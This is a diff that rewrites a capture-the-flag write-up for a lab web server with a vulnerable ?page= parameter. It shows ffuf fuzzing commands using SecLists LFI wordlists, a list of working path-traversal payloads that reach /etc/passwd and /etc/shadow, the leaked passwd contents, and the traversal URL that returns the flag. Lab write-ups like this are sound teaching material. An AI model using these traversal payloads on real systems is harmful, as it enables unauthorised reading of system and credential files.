@@ -1,10 +1,14 @@
-As we hit the url that we got "http://10.48.136.217/" Into the browser it gave us a homepage of songs that looks like this 
+# Lo-Fi 🎵 — Writeup
 
-<homepage_pic>
+---
 
-Here is the source code 
+## 🔍 Enumeration
+
+When we opened the URL `http://10.48.136.217/` in the browser, it displayed a homepage listing lo-fi songs.
+
+Here is the source code:
+
 ```html
-
 <!DOCTYPE html>
 <html lang="en">
 
@@ -49,8 +53,6 @@ Here is the source code
         </div>
     </nav>
 
-    
-
         <!-- Page Content -->
     <div class="container">
 
@@ -59,22 +61,19 @@ Here is the source code
             <!-- Blog Entries Column -->
             <div class="col-md-8">
 
-                <h1 class="my-4">Cool beats to listen to</i></h1>
-
+                <h1 class="my-4">Cool beats to listen to</h1>
 
                 <!-- Blog Post -->
                 <div class="card mb-4">
-					<div class="card-body">
+                    <div class="card-body">
 
-
-						<h2 class="card-title">Relax</h2>
+                        <h2 class="card-title">Relax</h2>
 
 <p class="card-text">
     <iframe width="680" height="360" src="https://www.youtube.com/embed/5qap5aO4i9A" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
-</p>                	</div>
+</p>                    </div>
                 </div>
 
-            
             </div>
 
             <!-- Sidebar Widgets Column -->
@@ -104,10 +103,10 @@ Here is the source code
                                 <ul class="list-unstyled mb-0">
                                     <li><a href="/?page=relax.php">Relax</a></li>
                                     <li><a href="/?page=sleep.php">Sleep</a></li>
-									<li><a href="/?page=chill.php">Chill</a></li>    
-									<li><a href="/?page=coffee.php">Coffee</a></li>
-									<li><a href="/?page=vibe.php">Vibe</a></li>
-									<li><a href="/?page=game.php">Game</a></li>
+                                    <li><a href="/?page=chill.php">Chill</a></li>
+                                    <li><a href="/?page=coffee.php">Coffee</a></li>
+                                    <li><a href="/?page=vibe.php">Vibe</a></li>
+                                    <li><a href="/?page=game.php">Game</a></li>
                                 </ul>
                             </div>
                         </div>
@@ -120,7 +119,6 @@ Here is the source code
     </div>
     <!-- /.container -->
 
-
     <!-- Footer -->
     <footer class="py-3 bg-dark footer">
         <div class="container">
@@ -129,58 +127,67 @@ Here is the source code
         <!-- /.container -->
     </footer>
 
-
 </body>
 
 </html>
 ```
 
-As we can see source code is not giving any clue to flag.
+As we can see, the source code doesn't give any clue about the flag.
 
-So we proceed to Directory enumuration and it gave us
+So we proceeded to directory enumeration, which gave us:
 
 ```text
-[23:34:48] 403 -  244B  - /.ht_wsr.txt                                      
-[23:34:48] 403 -  242B  - /.htaccess.bak1                                   
-[23:34:48] 403 -  243B  - /.htaccess.sample                                 
+[23:34:48] 403 -  244B  - /.ht_wsr.txt
+[23:34:48] 403 -  242B  - /.htaccess.bak1
+[23:34:48] 403 -  243B  - /.htaccess.sample
 [23:34:48] 403 -  242B  - /.htaccess.orig
 [23:34:48] 403 -  242B  - /.htaccessBAK
 [23:34:48] 403 -  244B  - /.htaccess_extra
 [23:34:48] 403 -  241B  - /.htaccessOLD
 [23:34:48] 403 -  243B  - /.htaccess_orig
 [23:34:48] 403 -  241B  - /.htaccess.save
-[23:34:48] 403 -  242B  - /.htaccess_sc                                     
+[23:34:48] 403 -  242B  - /.htaccess_sc
 [23:34:48] 403 -  242B  - /.htaccessOLD2
-[23:34:48] 403 -  237B  - /.htm                                             
-[23:34:48] 403 -  238B  - /.html                                            
-[23:34:48] 403 -  246B  - /.htpasswd_test                                   
-[23:34:48] 403 -  241B  - /.httr-oauth                                      
-[23:34:48] 403 -  241B  - /.htpasswds     
-[23:35:44] 403 -  241B  - /server-status/                                    
-[23:35:44] 403 -  240B  - /server-status  
-
+[23:34:48] 403 -  237B  - /.htm
+[23:34:48] 403 -  238B  - /.html
+[23:34:48] 403 -  246B  - /.htpasswd_test
+[23:34:48] 403 -  241B  - /.httr-oauth
+[23:34:48] 403 -  241B  - /.htpasswds
+[23:35:44] 403 -  241B  - /server-status/
+[23:35:44] 403 -  240B  - /server-status
 ```
-But this  also doesn't gave us a Interesting endpoint for the further enumuration.
 
-In the Homepage under the section Discography When tapped on Relax the url changes to **http://10.48.136.217/?page=relax.php**
+But this also didn't give us any interesting endpoint for further enumeration.
 
-So here we can do fuzzing on this url for different pages.
+---
 
-<fuzz_res>
+## 🕵️ Finding the Vulnerability
 
-As we can see it has only listed 2 endpoints.
+In the homepage, under the **Discography** section, clicking on **Relax** changed the URL to `http://10.48.136.217/?page=relax.php`.
 
-So we are trying manually different values for the page=
+This means we can fuzz the `?page=` parameter for different values.
 
-and in this many tries wehn i put page=/home it showed me something interesting.
+![fuzz_res](fuzz_res.png)
 
-<hackerr_spot>
+As we can see, only 2 endpoints are listed.
 
-but with some steps i understand what whatever will be after / no matter it prints *HACKKERRR!! HACKER DETECTED. STOP HACKING YOU STINKIN HACKER!*
+So we started manually testing different values for `page=`.
 
-Now we know it somehow reacts to some payload so this room is about LFI path transversal and File Inclusion.
+After many tries, when we set `page=/home`, it showed something interesting:
 
-We need to do fuzzing with the wordlist mainly focused on LFI path transversal and File Inclusion. As it webserver is apache.
+![hackerr_spot](hackerr_spot.png)
+
+After some testing, we understood that no matter what comes after `/`, it always prints:
+
+> *HACKKERRR!! HACKER DETECTED. STOP HACKING YOU STINKIN HACKER!*
+
+Now we know it reacts to certain payloads — this room is about **LFI (Local File Inclusion) / Path Traversal**. 🔓
+
+---
+
+## 💣 Exploitation
+
+We need to fuzz with a wordlist specifically focused on LFI and path traversal. Since the web server is Apache:
 
 ```
 Not Found
@@ -189,36 +196,35 @@ The requested URL /fas was not found on this server.
 Apache/2.2.22 (Ubuntu) Server at 10.48.161.15 Port 80
 ```
 
-Now we do fuzzing with those having the websever as apache. The wordlist is */home/Seclists/Discovery/Web-Content/Web-Servers/Apache.txt* with the command
+We tried the Apache-specific wordlist first — the wordlist at `/home/Seclists/Discovery/Web-Content/Web-Servers/Apache.txt` — with the command:
 
 ```
 ffuf -u http://10.48.161.15/?page=FUZZ -w /home/Seclists/Discovery/Web-Content/Web-Servers/Apache.txt -fw 1367,1369
 ```
- This also not gave us a valid endpoint. 
 
-So i searched inside the seclist and found there is spcifically many files fo r the lfi under the folder /Seclists/fuzzing/lfi/
+This didn't give us a valid endpoint either.
+
+So we searched inside SecLists and found there are specifically many files for LFI under `/Seclists/fuzzing/lfi/`:
+
 ```
-LFI-etc-files-of-all-linux-packages.txt     
-LFI-gracefulsecurity-linux.txt              
-LFI-gracefulsecurity-windows.txt            
-LFI-Jhaddix.txt                             
-LFI-LFISuite-pathtotest-huge.txt            
-LFI-LFISuite-pathtotest.txt                 
+LFI-etc-files-of-all-linux-packages.txt
+LFI-gracefulsecurity-linux.txt
+LFI-gracefulsecurity-windows.txt
+LFI-Jhaddix.txt
+LFI-LFISuite-pathtotest-huge.txt
+LFI-LFISuite-pathtotest.txt
 LFI-linux-and-windows_by-1N3@CrowdShield.txt
-LFI-Windows-adeadfed.txt                    
+LFI-Windows-adeadfed.txt
 OMI-Agent-Linux.txt
 ```
 
-We are going to specfically use the LFI-Jhaddix.txt.
-
-With The command
+We specifically used `LFI-Jhaddix.txt` with the command:
 
 ```
-ffuf -u http://10.48.161.15/?page=FUZZ -w 
-/home/Seclists/fuzzing/lfi/LFI-Jhaddix.txt -fw 1367,1369
+ffuf -u http://10.48.161.15/?page=FUZZ -w /home/Seclists/fuzzing/lfi/LFI-Jhaddix.txt -fw 1367,1369
 ```
 
-And we will get several endpoint with this command only.
+This returned several endpoints:
 
 ```
 %0a/bin/cat%20/etc/passwd [Status: 200, Size: 3987, Words: 1368, Lines: 125, Duration: 79ms]
@@ -244,8 +250,8 @@ And we will get several endpoint with this command only.
 ../../../../../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 73ms]
 ../../../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 74ms]
 ../../../../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 74ms]
-../../../../etc/passwd  [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 78ms]
-../../../etc/passwd     [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 85ms]
+../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 78ms]
+../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 85ms]
 ../../../../../../../../../../../../../../../../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 66ms]
 ../../../../../../../../../../../../../../../../../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 68ms]
 ../../../../../../../../../../../../../../../../../../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 85ms]
@@ -264,7 +270,7 @@ And we will get several endpoint with this command only.
 ../../../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 73ms]
 ../../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 73ms]
 ../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 82ms]
-../../../etc/passwd%00  [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 81ms]
+../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 81ms]
 ../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 81ms]
 ../../../../../../etc/passwd&=%3C%3C%3C%3C [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 86ms]
 ../../../../../../../../../../../../etc/shadow [Status: 200, Size: 3877, Words: 1358, Lines: 124, Duration: 70ms]
@@ -275,20 +281,22 @@ And we will get several endpoint with this command only.
 ..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 3492ms]
 ..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 3501ms]
 :: Progress: [930/930] :: Job [1/1] :: 117 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
-
 ```
 
-Let's Hit the first endpoint 
+---
 
-*http://10.48.161.15/?page=..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd*
+## 🚩 Getting the Flag
 
-and we got 
+Let's hit the first valid endpoint:
+
+`http://10.48.161.15/?page=..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd`
+
+And we got:
 
 ```
 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh
 ```
-Now the endpoint *http://10.48.161.15/?page=..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd* is giving me the content of /etc/passwd
 
-And if we modify the url to this *http://10.48.161.15/?page=..%2F..%2F..%2F%2F..%2F..%2Fflag.txt* We will get the flag
+The endpoint `http://10.48.161.15/?page=..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd` is successfully leaking the contents of `/etc/passwd`.
 
-<flag_img>
+By modifying the URL to `http://10.48.161.15/?page=..%2F..%2F..%2F%2F..%2F..%2Fflag.txt`, we get the flag! 🎉
